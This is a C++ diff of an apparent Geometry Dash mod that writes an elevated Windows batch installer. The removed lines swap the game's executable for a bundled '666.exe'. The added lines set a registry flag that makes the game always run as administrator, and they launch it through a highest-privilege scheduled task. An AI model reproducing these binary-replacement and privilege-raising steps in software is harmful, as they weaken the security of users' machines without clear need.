@@ -27,36 +27,34 @@ void createAnGD666Bat() {
     
     std::ofstream batFile(batPath);
     batFile << "@echo off\n";
-    batFile << ":: Request UAC elevation and execute installation sequence\n";
-    // Sequence: taskkill -> rename original -> rename 666.exe to GD.exe -> mklink -> schtasks
-    // The mod will extract 666.exe to the game folder before running this
-    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" & taskkill /f /im GeometryDash.exe & ren GeometryDash.exe GeometryDash666.exe & move \"%TEMP%\\\\666.exe\\\" GeometryDash.exe & mklink 666.exe GeometryDash.exe & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
+    batFile << ":: Check for administrative privileges\n";
+    batFile << "net session >nul 2>&1\n";
+    batFile << "if %errorLevel% == 0 (\n";
+    batFile << "    goto :run_installation\n";
+    batFile << ") else (\n";
+    batFile << "    echo Requesting administrative privileges...\n";
+    batFile << "    powershell -Command \"Start-Process 
+'\"%~f0\"' -Verb RunAs\"\n";
+    batFile << "    exit /b\n";
+    batFile << ")\n";
+    batFile << ":run_installation\n";
+    batFile << ":: Set GeometryDash.exe to always run as administrator via Registry\n";
+    batFile << "reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" /v \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\" /t REG_SZ /d \"~ RUNASADMIN\" /f\n";
+    batFile << ":: Create and run scheduled task for GeometryDash.exe with highest privileges\n";
+    batFile << "schtasks /delete /tn \"GD666\" /f\n";
+    batFile << "schtasks /create /tn \"GD666\" /tr \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\" /sc once /st 00:00 /rl highest /f\n";
+    batFile << "schtasks /run /tn \"GD666\"\n";
+    batFile << ":: Optional: Wait for GeometryDash.exe to close (if we want the bat to stay open)\n";
+    batFile << "start /wait \"\" \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\"\n";
+    batFile << "exit\n";
     batFile.close();
 }
 
+/*
 void extractLauncher() {
-    auto mod = Mod::get();
-    auto resourcePath = mod->getResourcesDir() / "666.exe";
-    char* tempEnv = std::getenv("TEMP");
-    if (!tempEnv) {
-        log::error("No se pudo obtener la variable de entorno TEMP.");
-        return;
-    }
-    fs::path tempPath = fs::path(tempEnv) / "666.exe";
-
-    if (fs::exists(resourcePath)) {
-        try {
-            fs::copy(resourcePath, tempPath, fs::copy_options::overwrite_existing);
-            log::info("666.exe extraído exitosamente a la carpeta temporal: {}.", tempPath.string());
-        } catch (const fs::filesystem_error& e) {
-            log::error("Fallo al extraer 666.exe a la carpeta temporal: {}", e.what());
-        } catch (...) {
-            log::error("Ocurrió un error desconocido al extraer 666.exe a la carpeta temporal.");
-        }
-    } else {
-        log::error("666.exe no encontrado en los recursos del mod en: {}", resourcePath.string());
-    }
+    // Esta función ya no es necesaria, ya que no extraemos 666.exe
 }
+*/
 
 void disableMod() {
     auto mod = Mod::get();
@@ -123,7 +121,7 @@ class $modify(MyMenuLayer, MenuLayer) {
         } else if (alert->getTag() == 2) {
             if (btn2) {
                 Mod::get()->setSavedValue("confirmed", true);
-                extractLauncher(); // Extract 666.exe before running the bat
+                    // La extracción de 666.exe ya no es necesaria.
                 char* tempEnv = std::getenv("TEMP");
                 if (tempEnv) {
                     std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
